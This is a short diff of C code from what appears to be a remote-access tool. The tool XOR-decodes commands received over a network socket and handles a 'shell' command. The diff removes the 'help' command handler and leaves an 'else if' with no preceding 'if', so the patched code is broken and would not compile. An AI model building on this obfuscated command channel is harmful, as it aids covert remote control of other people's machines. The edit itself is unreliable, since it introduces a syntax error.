@@ -116,12 +116,6 @@ int main(void) {
 			}
 */
 			char* xorbuf = XOR(buf, key, strlen(buf), keylen);
-			if(strncmp(xorbuf, "help\n", 5) == 0)
-			{
-				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
-				send(sock, xorhelp, strlen(MSG_HELP), 0);
-				free(xorhelp);
-			}
 
 			else if(str_starts_with(xorbuf, "shell") == 0)
 			{
